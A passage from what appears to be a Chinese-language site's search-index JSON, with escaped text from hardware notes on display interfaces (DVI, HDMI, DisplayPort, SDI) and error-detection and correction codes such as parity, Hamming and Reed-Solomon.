\u200b\u51fa\u6765\u200b\u5f97\u5230\u200b\u7684\u200b\u8fd8\u662f\u200b\u6a21\u62df\u4fe1\u53f7\u200b\uff0c\u200b\u5982\u679c\u200b\u53e6\u4e00\u4fa7\u200b\u7684\u200b\u8bbe\u5907\u200b\u53ea\u200b\u652f\u6301\u200b\u5728\u200b DVI \u200b\u4e0a\u200b\u8d70\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u5219\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p> <p>DVI \u200b\u5728\u200b\u4f20\u8f93\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b 3 \u200b\u5bf9\u200b\uff08Single link\uff09\u200b\u6216\u8005\u200b 6 \u200b\u5bf9\u200b\uff08Dual link\uff09TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u89c6\u9891\u4fe1\u53f7\u200b\uff0c\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u65f6\u949f\u200b\u3002\u200b\u5176\u4e2d\u200b Single link \u200b\u6a21\u5f0f\u200b\u548c\u200b HDMI \u200b\u662f\u200b\u517c\u5bb9\u200b\u7684\u200b\u3002</p> <p>TMDS \u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5185\u200b\uff0c\u200b\u4f20\u8f93\u200b 8 bit \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u7ecf\u8fc7\u200b 8b/10b \u200b\u7f16\u7801\u200b\u5728\u200b\u5dee\u5206\u200b\u5bf9\u200b\u4e0a\u200b\u4f20\u8f93\u200b\u3002\u200b\u56e0\u6b64\u200b\u5bf9\u4e8e\u200b 165 MHz \u200b\u7684\u200b TMDS \u200b\u65f6\u949f\u200b\uff0c\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\u6570\u636e\u200b\u7684\u200b\u901f\u7387\u200b\u662f\u200b \\(165 \\mathrm{MHz} * 3 * 8 = 3.96 \\mathrm{Gbps}\\)\u3002</p> <p>DVI \u200b\u4e0d\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#hdmi","title":"HDMI","text":"<p>HDMI \u200b\u5728\u200b\u4e09\u200b\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u5bf9\u200b TMDS \u200b\u5dee\u5206\u200b\u65f6\u949f\u200b\u548c\u200b DDC\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u8fde\u63a5\u5668\u200b\u662f\u200b Type A\uff0c\u200b\u6709\u65f6\u5019\u200b\u4e5f\u200b\u80fd\u200b\u770b\u5230\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b Mini HDMI\uff08Type C\uff09\u200b\u548c\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b Micro HDMI\uff08Type D\uff09\u3002</p> <p>HDMI \u200b\u9664\u4e86\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\uff0c\u200b\u8fd8\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>HDMI \u200b\u968f\u7740\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\uff0c\u200b\u9010\u6e10\u200b\u63d0\u9ad8\u200b\u4e86\u200b TMDS \u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u3002HDMI 1.0 \u200b\u7248\u672c\u200b\u548c\u200b DVI \u200b\u4e00\u6837\u200b\uff0c\u200b\u6700\u9ad8\u200b TMDS \u200b\u65f6\u949f\u200b\u662f\u200b 165 MHz\uff0c\u200b\u4e0d\u200b\u8ba1\u5165\u200b 8b/10b \u200b\u7f16\u7801\u200b\u635f\u8017\u200b\u7684\u8bdd\u200b\uff08\u200b\u4e0b\u540c\u200b\uff09\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u662f\u200b \\(165 \\mathrm{MHz} * 3 * 10 = 4.95 \\mathrm{Gbps}\\)\uff1bHDMI 1.3 \u200b\u7248\u672c\u200b\u628a\u200b TMDS \u200b\u65f6\u949f\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 340 MHz\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(340 \\mathrm{MHz} * 3 * 10 = 10.2 \\mathrm{Gbps}\\)\u3002HDMI 2.0 \u200b\u7248\u672c\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 600MHz\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(600 \\mathrm{MHz} * 3 * 10 = 18 \\mathrm{Gbps}\\)\u3002</p> <p>HDMI 2.1 \u200b\u4e0d\u518d\u200b\u4f7f\u7528\u200b\u5355\u72ec\u200b\u7684\u200b TMDS \u200b\u65f6\u949f\u200b\u5dee\u5206\u200b\u5bf9\u200b\uff0c\u200b\u628a\u200b\u6700\u540e\u200b\u4e00\u5bf9\u200b\u4e5f\u200b\u7528\u6765\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u628a\u200b\u6570\u636e\u7f16\u7801\u200b\u4ece\u200b 8b/10b \u200b\u6539\u6210\u200b\u4e86\u200b 16b/18b\uff0c\u200b\u4f20\u8f93\u901f\u7387\u200b\u8fbe\u5230\u200b \\(4 * 12 \\mathrm{Gbps} = 48 \\mathrm{Gbps}\\)\uff0c\u200b\u76f8\u6bd4\u200b HDMI 2.0 \u200b\u6709\u200b\u4e86\u200b\u5de8\u5927\u200b\u7684\u200b\u63d0\u5347\u200b\u3002\u200b\u6309\u7167\u200b 16b/18b \u200b\u7b97\u200b\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u662f\u200b 42.7 Gbps\uff0c\u200b\u4f46\u200b HDMI 2.1 \u200b\u8fd8\u6709\u200b\u989d\u5916\u200b\u7684\u200b FEC \u200b\u5f00\u9500\u200b\uff08RS(255,251)\uff09\uff0c\u200b\u6298\u7b97\u200b\u4e0b\u6765\u200b\u662f\u200b \\(48 \\mathrm{Gbps} * 16 / 18 * 251 / 255 = 42.0 \\mathrm{Gbps}\\)\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u8fd9\u200b\u51e0\u4ee3\u200b HDMI \u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff0c\u200b\u5176\u4e2d\u200b HDMI 2.1 \u200b\u7248\u672c\u200b\u6ca1\u200b\u8003\u8651\u200b FEC \u200b\u5f00\u9500\u200b\uff1a</p> 1.0-1.2 1.3-1.4 2.0 2.1 \u200b\u4f20\u8f93\u901f\u7387\u200b 4.95 Gbps 10.2 Gbps 18 Gbps 48 Gbps \u200b\u6570\u636e\u200b\u901f\u7387\u200b 3.96 Gbps 8.16 Gbps 14.4 Gbps 42.0 Gbps \u200b\u7f16\u7801\u65b9\u5f0f\u200b 8b/10b 8b/10b 8b/10b 16b/18b \u200b\u5206\u8fa8\u7387\u200b 1080p 60Hz 1440p 75Hz 4k 60Hz 8k 30Hz <p>\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u8868\u683c\u200b\u4e0d\u662f\u200b\u7edd\u5bf9\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b HDMI 1.4b \u200b\u5728\u200b\u91c7\u7528\u200b\u4e0d\u200b\u5728\u200b HDMI 1.4b \u200b\u6807\u51c6\u200b\u91cc\u200b\u4f46\u662f\u200b\u7531\u200b\u663e\u5361\u200b\u548c\u200b\u663e\u793a\u5668\u200b\u652f\u6301\u200b\u7684\u200b YCbCr 420 \u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8f93\u51fa\u200b 4k 60Hz \u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\uff1aNVIDIA Kepler Cards Get HDMI 4K@60Hz Support (Kind Of)\u3002</p> <p>HDMI 2.1 \u200b\u8fd8\u200b\u652f\u6301\u200b DSC \u200b\u89c6\u9891\u6d41\u200b\u538b\u7f29\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u5982\u200b 8k 60Hz \u200b\u751a\u81f3\u200b 8k 120Hz\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia HDMI 2.1 FEC RX IP Core</p>"},{"location":"hardware/display_interface.html#displayport","title":"DisplayPort","text":"<p>DisplayPort \u200b\u91c7\u7528\u200b\u56db\u5bf9\u200b\u5dee\u5206\u200b\u5bf9\u6765\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b\u89c6\u9891\u200b\u548c\u200b\u97f3\u9891\u200b\u7b49\u200b\u3002</p> <p>DisplayPort 1.0 \u200b\u7248\u672c\u200b\u652f\u6301\u200b 10.8 Gbps \u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\uff08\u200b\u7f16\u7801\u65b9\u5f0f\u200b 8b/10b\uff0c\u200b\u56e0\u6b64\u200b\u6570\u636e\u200b 8.64 Gbps\uff09\u3002DisplayPort 1.2 \u200b\u7248\u672c\u200b\u901f\u7387\u200b\u7ffb\u500d\u200b\uff0c\u200b\u8fbe\u5230\u200b\u4e86\u200b 21.6 Gbps\uff08\u200b\u6570\u636e\u200b 17.28 Gbps\uff09\u3002DisplayPort 1.3 \u200b\u8fdb\u4e00\u6b65\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 32.4 Gbps\uff08\u200b\u6570\u636e\u200b 25.92 Gbps\uff09\u3002DisplayPort 2.0 \u200b\u8fdb\u4e00\u6b65\u63d0\u9ad8\u200b\u5230\u200b 80 Gbps\uff08\u200b\u7f16\u7801\u65b9\u5f0f\u200b 128b/132b\uff09\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b 77.37 Gbps\uff08\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u4e0d\u660e\u200b\uff09\u3002</p> <p>DisplayPort \u200b\u53ef\u4ee5\u200b\u5728\u200b USB Type C \u200b\u4e0a\u200b\u901a\u8fc7\u200b Alternate Mode \u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5728\u200b\u7b14\u8bb0\u672c\u200b\u6216\u200b\u624b\u673a\u200b\u4e2d\u200b\uff0c\u200b\u5185\u7f6e\u200b\u7684\u200b\u663e\u793a\u5668\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u91c7\u7528\u200b eDP \u200b\u63a5\u53e3\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#sdi","title":"SDI","text":"<p>SDI \u200b\u5168\u79f0\u200b Serial Digital Interface\uff0c\u200b\u5728\u200b\u540c\u8f74\u7535\u7f06\u200b\u4e0a\u200b\uff0c\u200b\u4e32\u884c\u200b\u4f20\u8f93\u200b\u89c6\u9891\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/error_detection_correction_code.html","title":"\u68c0\u9519\u200b\u7ea0\u9519\u7801","text":""},{"location":"hardware/error_detection_correction_code.html#_2","title":"\u7406\u8bba","text":"<p>\u200b\u5728\u200b\u6570\u636e\u4f20\u8f93\u200b\u65f6\u200b\uff0c\u200b\u8003\u8651\u200b\u5230\u200b\u5404\u79cd\u56e0\u7d20\u200b\u7684\u200b\u5370\u8c61\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u90e8\u5206\u200b\u6570\u636e\u200b\u51fa\u9519\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u7f16\u7801\u65b9\u6cd5\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u63a5\u53d7\u65b9\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b\u9519\u8bef\u200b\uff0c\u200b\u8ba9\u200b\u53d1\u9001\u200b\u65b9\u200b\u91cd\u65b0\u200b\u4f20\u8f93\u200b\uff1b\u200b\u6216\u8005\u200b\u8ba9\u200b\u63a5\u53d7\u65b9\u200b\u76f4\u63a5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002\u200b\u968f\u7740\u200b\u4f20\u8f93\u901f\u5ea6\u200b\u4e0d\u65ad\u200b\u63d0\u9ad8\u200b\uff0c\u200b\u8bef\u7801\u7387\u200b\u4e0a\u5347\u200b\uff0c\u200b\u91cd\u65b0\u200b\u4f20\u8f93\u200b\u7684\u200b\u6982\u7387\u200b\u63d0\u9ad8\u200b\uff0c\u200b\u901a\u5e38\u200b\u5c31\u200b\u4f1a\u200b\u5f15\u5165\u200b\u7ea0\u9519\u7801\u200b\uff0c\u200b\u4e00\u822c\u200b\u53eb\u505a\u200b FEC\uff08Forward Error Correction\uff09\u3002</p> <p>\u200b\u6838\u5fc3\u200b\u601d\u8def\u200b\u662f\u200b\u53d1\u9001\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5197\u4f59\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u539f\u59cb\u6570\u636e\u200b\u5728\u200b\u7f16\u7801\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e00\u90e8\u5206\u200b\u5408\u6cd5\u200b\u503c\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u662f\u200b\u975e\u6cd5\u200b\u7684\u200b\uff0c\u200b\u4e14\u200b\u5408\u6cd5\u200b\u503c\u200b\u4e4b\u95f4\u200b\u4fdd\u8bc1\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6700\u5c0f\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u3002\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e5f\u200b\u53eb\u200b Hamming \u200b\u8ddd\u79bb\u200b\uff0c\u200b\u7b49\u4e8e\u200b\u5f02\u6216\u200b\u540e\u200b\u4e8c\u8fdb\u5236\u200b\u8868\u793a\u200b\u4e2d\u200b 1 \u200b\u7684\u200b\u4e2a\u6570\u200b\u3002</p> <p>\u200b\u5728\u200b\u4f20\u8f93\u200b\u51fa\u9519\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u9519\u200b\u7684\u200b\u4f4d\u6570\u200b\u5728\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e4b\u5185\u200b\uff0c\u200b\u5c31\u200b\u4e00\u5b9a\u200b\u4f1a\u200b\u4ece\u200b\u5408\u6cd5\u200b\u503c\u200b\u53d8\u4e3a\u200b\u975e\u6cd5\u200b\u503c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b\u9519\u8bef\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u9519\u200b\u7684\u200b\u4f4d\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u8ddd\u79bb\u200b\u975e\u6cd5\u200b\u503c\u200b\u6700\u8fd1\u200b\u7684\u200b\u5408\u6cd5\u200b\u503c\u200b\u552f\u4e00\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002</p>"},{"location":"hardware/error_detection_correction_code.html#parity","title":"\u5947\u5076\u6821\u9a8c\u200b Parity","text":"<p>\u200b\u5947\u5076\u6821\u9a8c\u200b\u5bf9\u200b\u6bcf\u200b k \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u989d\u5916\u200b\u7684\u200b 1 \u200b\u4f4d\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u8fd9\u200b k \u200b\u4f4d\u200b\u6570\u636e\u200b\u4e2d\u6709\u200b\u5947\u6570\u200b\u4e2a\u200b 1 \u200b\u8fd8\u662f\u200b\u5076\u6570\u200b\u4e2a\u200b 1\u3002\u200b\u5947\u5076\u6821\u9a8c\u200b\u7f16\u7801\u200b\u540e\u200b\uff0c\u200b\u5408\u6cd5\u200b\u503c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u4e3a\u200b 2\uff0c\u200b\u53ea\u80fd\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(k/(k+1)\\)\u3002</p> <p>UART \u200b\u534f\u8bae\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u5947\u5076\u6821\u9a8c\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aParity bit</p>"},{"location":"hardware/error_detection_correction_code.html#_3","title":"\u91cd\u590d\u200b\u7f16\u7801","text":"<p>\u200b\u91cd\u590d\u200b\u7f16\u7801\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u8f93\u5165\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u4f4d\u200b\u91cd\u590d\u200b n \u200b\u6b21\u200b\uff0cn \u200b\u4e3a\u200b\u5947\u6570\u200b\uff1a\u200b\u4f8b\u5982\u200b n \u200b\u7b49\u4e8e\u200b 3\uff0c\u200b\u90a3\u4e48\u200b 0 \u200b\u53d8\u6210\u200b 000\uff0c1 \u200b\u53d8\u6210\u200b 111\uff0c\u200b\u4e24\u4e2a\u200b\u5408\u6cd5\u200b\u503c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u662f\u200b 3\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e0\u6cd5\u200b\u548c\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u533a\u5206\u200b\u5f00\u200b\u3002\u200b\u89e3\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6309\u200b n \u200b\u4f4d\u200b\u5206\u7ec4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5206\u7ec4\u200b\u5185\u200b\u7684\u200b 0 \u200b\u548c\u200b 1 \u200b\u7684\u200b\u6570\u91cf\u200b\u54ea\u4e2a\u200b\u591a\u200b\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u539f\u59cb\u200b\u503c\u200b\u662f\u200b\u54ea\u4e2a\u200b\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(1/n\\)\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aRepetition code</p>"},{"location":"hardware/error_detection_correction_code.html#hamming","title":"Hamming \u200b\u7801","text":"<p>Hamming \u200b\u7801\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u5e76\u200b\u7ea0\u6b63\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8fbe\u5230\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff0c\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u81f3\u5c11\u200b\u662f\u200b 3\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u7ea0\u6b63\u9519\u8bef\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 1 \u200b\u4f4d\u200b\u6216\u8005\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u662f\u200b\u54ea\u79cd\u200b\u60c5\u51b5\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u5982\u679c\u200b\u7ed9\u200b Hamming \u200b\u7801\u200b\u52a0\u4e0a\u200b\u989d\u5916\u200b\u7684\u200b\u5947\u5076\u6821\u9a8c\u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u81f3\u5c11\u200b\u662f\u200b 4\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u68c0\u6d4b\u200b\u51fa\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u80fd\u200b\u7ea0\u6b63\u200b 2 \u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u8fd9\u79cd\u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u200b\u5b9e\u73b0\u200b\u4e86\u200b SECDED\uff08Single Error Correction\uff0cDouble Error Detection\uff09\u3002</p> <p>\u200b\u5047\u8bbe\u200b\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b k \u200b\u4f4d\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5197\u4f59\u200b\u7684\u200b r \u200b\u4f4d\u200b\u6821\u9a8c\u7801\u200b\uff0c\u200b\u5f53\u200b\u51fa\u73b0\u200b 1 \u200b\u4f4d\u200b\u9519\u8bef\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff0c\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b k+r \u200b\u4f4d\u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u4e2a\u200b\u5730\u65b9\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u9519\u8bef\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5e94\u8be5\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5197\u4f59\u200b\u7684\u200b r \u200b\u4f4d\u200b\u6821\u9a8c\u7801\u200b\u63a8\u65ad\u200b\u51fa\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff1a</p> \\[ 2^r \\ge k+r \\] <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6ca1\u6709\u200b\u51fa\u9519\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff1a</p> \\[ 2^r \\ge k+r+1 \\] <p>\u200b\u4f8b\u5982\u200b\u5f53\u200b \\(r=3\\) \u200b\u65f6\u200b\uff0c\\(k \\le 4\\)\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u53d6\u200b \\(k=4\\)\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b\u6bcf\u200b 4 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u6dfb\u52a0\u200b 3 \u200b\u4f4d\u200b\u7684\u200b\u6821\u9a8c\u7801\u200b\uff0c\u200b\u4e00\u5171\u200b\u662f\u200b 7 \u200b\u4f4d\u200b\u3002\u200b\u6b64\u65f6\u200b\u5c31\u200b\u79f0\u200b\u8fd9\u4e2a\u200b\u7f16\u7801\u200b\u4e3a\u200b Hamming(7,4)\u3002</p> <p>\u200b\u91cd\u590d\u200b\u7f16\u7801\u200b\u5728\u200b n=3 \u200b\u65f6\u200b\u7b49\u4ef7\u200b\u4e8e\u200b Hamming(3,1)\u3002</p> <p>\u200b\u7f16\u7801\u200b\u7684\u200b\u6548\u7387\u200b\u662f\u200b \\(k/(k+r)\\)\u3002</p> <p>ECC DRAM \u200b\u5bf9\u200b 64 \u200b\u4f4d\u200b\u6570\u636e\u200b\u6dfb\u52a0\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5197\u4f59\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u6765\u200b\u5b9e\u73b0\u200b SECDED\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aHamming code</p>"},{"location":"hardware/error_detection_correction_code.html#reed-soloman","title":"Reed-Soloman","text":"<p>Reed-Solomon \u200b\u6709\u200b\u4e09\u4e2a\u200b\u53c2\u6570\u200b\uff1a\u200b\u5b57\u6bcd\u8868\u200b\u5927\u5c0f\u200b \\(q\\)\uff0c\u200b\u7f16\u7801\u200b\u540e\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b \\(n\\) \u200b\u548c\u200b\u6570\u636e\u200b\u957f\u5ea6\u200b \\(k\\)\uff0c\u200b\u8981\u6c42\u200b \\(k &lt; n \\le q\\) \u200b\u4e14\u200b \\(q\\) \u200b\u662f\u200b\u7d20\u6570\u200b\u3002</p> <p>Reed-Solomon \u200b\u7b97\u6cd5\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b \\(k\\) \u200b\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u6570\u636e\u200b\u8303\u56f4\u200b\u90fd\u200b\u5728\u200b \\([0, q-1]\\) \u200b\u5185\u200b\uff0c\u200b\u4ee5\u200b\u8fd9\u200b \\(k\\) \u200b\u4e2a\u6570\u200b\u4e3a\u200b\u7cfb\u6570\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(p\\)\u3002\u200b\u53d6\u200b \\(n\\) \u200b\u4e2a\u70b9\u200b \\(a_1, \\ldots a_n\\)\uff0c\u200b\u5206\u522b\u200b\u5e26\u5165\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u5bf9\u200b \\(q\\) \u200b\u53d6\u4f59\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b Reed Solomon \u200b\u7f16\u7801\u200b\uff1a</p> \\[ p_x(a) = \\sum_{i=1}^k x_ia^{i-1} \\bmod q \\] \\[ C(x) = (p_x(a_1), \\ldots, p_x(a_n)) \\] <p>\u200b\u7531\u4e8e\u200b\u4efb\u610f\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b \\(k\\) \u200b\u6b21\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u6700\u200b\u591a\u53ea\u200b\u4f1a\u200b\u6709\u200b \\(k-1\\) \u200b\u4e2a\u200b\u4ea4\u70b9\u200b\uff0c\u200b\u6240\u4ee5\u200b Reed Solomon \u200b\u7f16\u7801\u200b\u4e2d\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b \\(n-(k-1)=n-k+1\\) \u200b\u4e2a\u503c\u200b\u90fd\u200b\u662f\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u5c31\u662f\u200b \\(n-k+1\\)\u3002</p> <p>\u200b\u56e0\u6b64\u200b Reed Solomon \u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b \\((n-k)/2\\) \u200b\u4e2a\u200b\u7cfb\u6570\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u8fd9\u200b\u4f7f\u5f97\u200b Reed Solomon 